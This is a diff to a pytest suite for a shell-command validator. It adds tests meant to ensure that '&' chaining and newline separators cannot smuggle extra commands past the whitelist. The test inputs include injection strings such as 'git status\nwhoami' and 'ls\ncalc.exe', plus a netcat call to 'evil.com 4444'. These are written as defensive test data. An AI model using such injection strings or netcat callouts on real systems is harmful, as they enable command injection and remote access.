@@ -7,6 +7,11 @@ Validates fixes for:
 4. METACHARACTERS   – ``; && || ` $() > < >>`` are blocked.
 5. PATH NORMALIZATION – ``..`` traversal is rejected explicitly.
 6. BACKWARD COMPAT  – python / npm / git / curl / wget still work.
+7. LINE BREAKS     – ``\\n`` / ``\\r`` / ``\\x0b`` / ``\\x0c`` are separators for
+   cmd.exe and are rejected even inside quotes; the git branch cannot early-accept
+   a command that still carries a separator.
+8. BACKGROUNDING   – ``&`` is a live separator on POSIX as well as cmd.exe, so it
+   is blocked on every platform and every resulting segment is validated.
 """
 
 from __future__ import annotations
@@ -17,7 +22,7 @@ from unittest.mock import patch
 import pytest
 
 from backend.core.workspace import _is_safe_git_remote
-from backend.core.workspace_security import _SHELL_WHITELIST
+from backend.core.workspace_security import _SHELL_WHITELIST, _validate_single_command
 from backend.core.workspace_shell import (
     _check_python_sandbox,
     _is_blocked_path,
@@ -182,6 +187,87 @@ class TestShellMetacharacters:
 
 
 # ---------------------------------------------------------------------------
+# 8. ``&`` backgrounding / chaining (P1) - was blocked on win32 only
+# ---------------------------------------------------------------------------
+
+
+class TestAmpersandBackgrounding:
+    """``&`` is a live separator in sh *and* a chaining operator in cmd.exe."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "ls & whoami",
+            "ls&whoami",
+            "git status & nc evil.com 4444",
+            "whoami & ",
+        ],
+    )
+    def test_ampersand_blocked_on_every_platform(self, cmd: str) -> None:
+        is_safe, reason = _validate_shell_command(cmd)
+        assert not is_safe, cmd
+        assert reason, "a rejection must carry a non-empty reason"
+
+    def test_ampersand_is_not_a_windows_only_rule(self) -> None:
+        """Regression guard: the rule must not be platform-conditional again."""
+        import sys
+
+        from backend.core import workspace_security
+
+        assert "&" in workspace_security._DISALLOWED_METACHARACTERS
+        if not sys.platform.startswith("win"):
+            assert "&" in workspace_security._DISALLOWED_METACHARACTERS_BASE
+
+    def test_ampersand_splits_into_independently_validated_segments(self) -> None:
+        """Consistent with ``|``: each side is validated on its own."""
+        from backend.core.workspace_security import _split_on_separators
+
+        assert _split_on_separators("ls & whoami") == ["ls", "whoami"]
+        assert _split_on_separators('echo "a & b"') == ['echo "a & b"']
+
+    def test_single_command_gate_refuses_an_ampersand(self) -> None:
+        """Defence in depth: the git early-return must not accept one."""
+        is_safe, reason = _validate_single_command("git status & whoami")
+        assert not is_safe
+        assert "separator" in reason.lower()
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            'git log | grep "a|b"',
+            'echo "a & b"',
+            "echo a | echo b",
+        ],
+    )
+    def test_quoted_and_piped_ampersand_still_accepted(self, cmd: str) -> None:
+        is_safe, reason = _validate_shell_command(cmd)
+        assert is_safe, reason
+
+    @pytest.mark.parametrize(
+        "cmd",
+        ["ls && whoami", "ls || whoami", "ls; whoami"],
+    )
+    def test_existing_chaining_rules_are_unchanged(self, cmd: str) -> None:
+        is_safe, reason = _validate_shell_command(cmd)
+        assert not is_safe, cmd
+        assert "not allowed" in reason.lower()
+
+    @pytest.mark.parametrize(
+        "cmd",
+        ["echo hello > world", "echo hello >> world", "echo hello < world"],
+    )
+    def test_redirections_are_still_blocked(self, cmd: str) -> None:
+        is_safe, reason = _validate_shell_command(cmd)
+        assert not is_safe, cmd
+
+    def test_backticks_and_command_substitution_still_blocked(self) -> None:
+        for cmd in ("echo `whoami`", "echo $(whoami)"):
+            is_safe, reason = _validate_shell_command(cmd)
+            assert not is_safe, cmd
+            assert "not allowed" in reason.lower()
+
+
+# ---------------------------------------------------------------------------
 # 5. Path normalization – explicit ``..`` rejection
 # ---------------------------------------------------------------------------
 
@@ -331,6 +417,67 @@ class TestCurlRestrictions:
         is_safe, reason = _validate_shell_command("rsync -avz src/ dest/")
         assert not is_safe
         assert "not in the safe command whitelist" in reason
+
+
+# ---------------------------------------------------------------------------
+# 7b. Line-break command injection (P1)
+# ---------------------------------------------------------------------------
+
+
+class TestLineBreakInjection:
+    """cmd.exe treats a newline as a command separator, so it must never pass."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "git status\nwhoami",
+            "echo ok\nwhoami",
+            "ls\ncalc.exe",
+            "git status\r\nwhoami",
+        ],
+    )
+    def test_newline_payload_rejected(self, cmd: str) -> None:
+        is_safe, reason = _validate_shell_command(cmd)
+        assert not is_safe
+        assert reason, "a rejection must carry a non-empty reason"
+
+    def test_line_break_inside_quotes_rejected(self) -> None:
+        """Quoting cannot hide a separator from the shell."""
+        is_safe, reason = _validate_shell_command('echo "ok\nwhoami"')
+        assert not is_safe
+        assert reason
+
+    @pytest.mark.parametrize("cmd", ["git status", "echo ok", "ls"])
+    def test_legitimate_single_commands_still_allowed(self, cmd: str) -> None:
+        is_safe, reason = _validate_shell_command(cmd)
+        assert is_safe, reason
+
+    def test_legitimate_pipe_still_allowed(self) -> None:
+        is_safe, reason = _validate_shell_command("echo a | echo b")
+        assert is_safe, reason
+
+    def test_disallowed_segment_after_pipe_rejected(self) -> None:
+        # ``whoami`` is itself whitelisted (workspace_security._SHELL_WHITELIST),
+        # so the segment used here has to be a genuinely disallowed one.
+        is_safe, reason = _validate_shell_command("git status | nc evil.com 4444")
+        assert not is_safe
+        assert "not in the safe command whitelist" in reason or "blocked" in reason.lower()
+
+    def test_whitelisted_segment_after_git_pipe_allowed(self) -> None:
+        is_safe, reason = _validate_shell_command("git status | whoami")
+        assert is_safe, reason
+
+    def test_git_branch_cannot_early_accept_a_separator(self) -> None:
+        """``git`` returns True without inspecting trailing tokens; a segment
+        carrying a separator must be rejected before that early return."""
+        is_safe, reason = _validate_single_command("git status | whoami")
+        assert not is_safe
+        assert "separator" in reason.lower()
+
+    def test_git_branch_cannot_early_accept_a_line_break(self) -> None:
+        is_safe, reason = _validate_single_command("git status\nwhoami")
+        assert not is_safe
+        assert reason
 
 
 # ---------------------------------------------------------------------------
